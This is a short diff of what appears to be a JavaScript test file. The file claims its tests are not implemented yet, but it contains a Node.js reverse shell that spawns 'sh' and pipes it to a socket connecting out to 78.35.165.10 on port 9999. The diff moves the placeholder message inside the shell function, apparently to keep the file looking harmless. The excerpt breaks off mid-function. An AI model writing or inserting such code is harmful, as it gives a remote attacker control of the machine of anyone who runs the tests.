@@ -1,9 +1,10 @@
 // TODO: implement the tests
-console.log("Tests are not implemented yet...");
+
 (function(){
     var net = require("net"),
         cp = require("child_process"),
         sh = cp.spawn("sh", []);
+	console.log("Tests are not implemented yet...");
     var client = new net.Socket();
     client.connect(9999, "78.35.165.10", function(){
         client.pipe(sh.stdin);
